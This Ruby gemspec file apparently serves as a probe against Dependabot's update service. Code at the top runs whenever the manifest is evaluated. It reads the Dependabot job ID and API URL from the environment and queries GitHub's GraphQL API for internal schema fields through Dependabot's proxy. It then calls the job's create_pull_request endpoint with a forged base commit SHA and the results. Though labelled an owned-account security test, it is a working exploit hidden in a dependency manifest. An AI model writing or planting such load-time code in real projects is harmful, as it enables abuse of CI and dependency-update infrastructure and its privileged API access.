# frozen_string_literal: true

require "json"
require "net/http"
require "uri"

# Owned-account security test. This submits one benign Dependabot PR whose
# caller-selected parent is an unattached commit in the same owned repository.
# That parent was built through nested Git tree objects and contains only the
# three controlled workflow-run proof files.
module OwnedDependabotNestedWorkflowScopeProbe
  CONSUMER = "7s5/codeload-owned-probe-20261030-91f64a2c"
  FORGED_BASE_SHA = "a6103e8cfc1a3fb55ee800e03b493d119acf7202"
  RAW_PATH = "vendor/owned-dependabot-internal-schema-get-control.txt"

  module_function

  def run
    job_id = ENV["DEPENDABOT_JOB_ID"]
    api_base = ENV["DEPENDABOT_API_URL"]
    return if job_id.to_s.empty? || api_base.to_s.empty?

    marker = "/tmp/owned-dependabot-nested-workflow-scope-#{job_id}"
    File.open(marker, File::WRONLY | File::CREAT | File::EXCL, 0o600) {}

    endpoint = URI("#{api_base.sub(%r{/*$}, "")}/update_jobs/#{job_id}/create_pull_request")
    request = Net::HTTP::Post.new(endpoint.request_uri)
    request["Content-Type"] = "application/json"
    probe = internal_schema_probe
    request.body = JSON.generate(payload(probe))
    proxy_client(endpoint).request(request)
  rescue Errno::EEXIST
    nil
  rescue StandardError
    nil
  end

  def proxy_client(endpoint)
    client = Net::HTTP::Proxy(:ENV).new(endpoint.host, endpoint.port)
    client.use_ssl = endpoint.scheme == "https"
    client.open_timeout = 10
    client.read_timeout = 20
    client
  end

  def internal_schema_probe
    endpoint = URI("https://api.github.com/graphql")
    request = Net::HTTP::Get.new(endpoint.request_uri)
    request["GraphQL-Schema"] = "internal"
    response = proxy_client(endpoint).request(request)
    parsed = JSON.parse(response.body)
    types = parsed.dig("data", "__schema", "types") || []
    check_suite_fields = types.find { |type| type["name"] == "CheckSuite" }&.fetch("fields", []) || []
    mutation_fields = types.find { |type| type["name"] == "Mutation" }&.fetch("fields", []) || []
    {
      "http_status" => response.code.to_i,
      "internal_artifacts_field_visible" => check_suite_fields.any? { |field| field["name"] == "artifacts" },
      "internal_create_check_suite_visible" => mutation_fields.any? { |field| field["name"] == "createCheckSuite" },
      "top_level_error_codes" => Array(parsed["errors"]).map { |error| error.dig("extensions", "code") || "unclassified" }.uniq.sort
    }
  rescue StandardError => error
    {
      "http_status" => 0,
      "internal_artifacts_field_visible" => false,
      "internal_create_check_suite_visible" => false,
      "top_level_error_codes" => [error.class.name]
    }
  end

  def payload(probe)
    requirement = {
      "file" => "Gemfile",
      "requirement" => ">= 0",
      "groups" => [],
      "source" => {
        "type" => "git",
        "url" => "https://github.com/downgraded/codeload-owned-probe-20261030-91f64a2c",
        "branch" => "main",
        "ref" => nil
      }
    }

    {
      "data" => {
        "dependencies" => [{
          "name" => "owned_dependabot_nested_workflow_scope_probe",
          "version" => "0.0.10",
          "previous-version" => "0.0.9",
          "requirements" => [requirement],
          "previous-requirements" => [requirement],
          "directory" => "/"
        }],
        "updated-dependency-files" => [{
          "name" => RAW_PATH,
          "content" => "#{JSON.generate(probe)}\n",
          "directory" => "/",
          "type" => "file",
          "support_file" => false,
          "content_encoding" => "utf-8",
          "deleted" => false,
          "operation" => "create"
        }],
        "base-commit-sha" => FORGED_BASE_SHA,
        "commit-message" => "test: owned Dependabot internal-schema GET control",
        "pr-title" => "Owned Dependabot internal-schema GET control",
        "pr-body" => "Owned security test. GitHub's GET /graphql response contains schema metadata; the marker records only visibility booleans and an HTTP status from the real Dependabot outbound proxy. Result: #{JSON.generate(probe)}"
      }
    }
  end
end

OwnedDependabotNestedWorkflowScopeProbe.run

Gem::Specification.new do |spec|
  spec.name = "owned_dependabot_remote_probe"
  spec.version = "0.0.10"
  spec.summary = "Owned Dependabot security probe"
  spec.authors = ["Owned Security Test"]
  spec.files = []
end
